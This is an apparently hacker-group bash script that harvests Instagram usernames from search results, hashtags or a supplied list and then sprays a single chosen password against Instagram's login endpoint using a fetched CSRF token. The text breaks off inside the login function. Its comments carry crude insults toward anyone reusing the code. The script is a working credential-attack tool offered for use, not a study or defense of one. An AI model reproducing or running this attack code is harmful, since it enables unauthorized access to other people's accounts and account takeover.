# !/bin/bash
# author         : raden/hades/raja
# thanks to      : surabayahackerlink - @raden_Ar
# recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
# Yamaap 
# menu
echo -e '''
1]. Get target from specific \e[1;31m@username\e[1;37m
2]. Get target from specific \e[1;31m#hashtag\e[1;37m
3]. Crack from your target list
'''

read -p $'What do you want   : \e[1;33m' opt

touch target

case $opt in
    1) # menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
        read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        ;;
    2) # menu 2
        read -p $'\e[37m[\e[34m?\e[37m] Tags for use      : \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "Page Not Found" ]]; then
        echo -e "$hashtag : ${red}Hashtag not found${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "[${blue}+${white}] Just found        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
            read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
        fi
        ;;
    3) # menu 3
        read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
        if [[ ! -e $list ]]; then
            echo -e "${red}file not found${white}"
            exit
            else
                cat $list > target
                echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
                read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        fi
        ;;
    *) # wrong menu
        echo -e "${white}options are not on the menu"
        sleep 1
        clear
        bash brute.sh
esac

# start_brute
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://
